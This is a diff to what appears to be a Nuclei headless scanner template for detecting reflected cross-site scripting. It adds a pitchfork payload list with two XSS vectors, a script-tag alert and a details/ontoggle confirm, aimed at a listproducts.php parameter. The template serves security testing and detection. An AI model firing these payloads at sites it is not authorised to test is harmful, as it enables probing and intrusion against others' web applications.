@@ -1,5 +1,6 @@
 headless:
-- extractors:
+- attack: pitchfork
+  extractors:
   - dsl:
     - reflected_text_query_type
     - reflected_text_query_message
@@ -9,10 +10,17 @@ headless:
     - reflected_text_query == true
     type: dsl
   matchers-condition: and
+  payloads:
+    path:
+    - /listproducts.php?cat=1
+    - /listproducts.php?cat=1
+    payload:
+    - <%2Fscript><script>alert%283%2B4%29<%2Fscript>
+    - '''>''><details/open/ontoggle=confirm(''XSS'')>'
   steps:
   - action: navigate
     args:
-      url: '{{BaseURL}}/listproducts.php?cat=1<%2Fscript><script>alert%283%2B4%29<%2Fscript>'
+      url: '{{BaseURL}}{{path}}{{payload}}'
   - action: waitdialog
     args:
       max-duration: 10s
@@ -20,7 +28,8 @@ headless:
 id: headless-reflected-xss
 info:
   author: yar0v1t
-  description: 'Reflected XSS vulnerability with headless mode.
+  description: 'A cross-site scripting (XSS) vulnerability with headless mode and
+    pitchfork attack.
 
     '
   name: Reflected Headless XSS
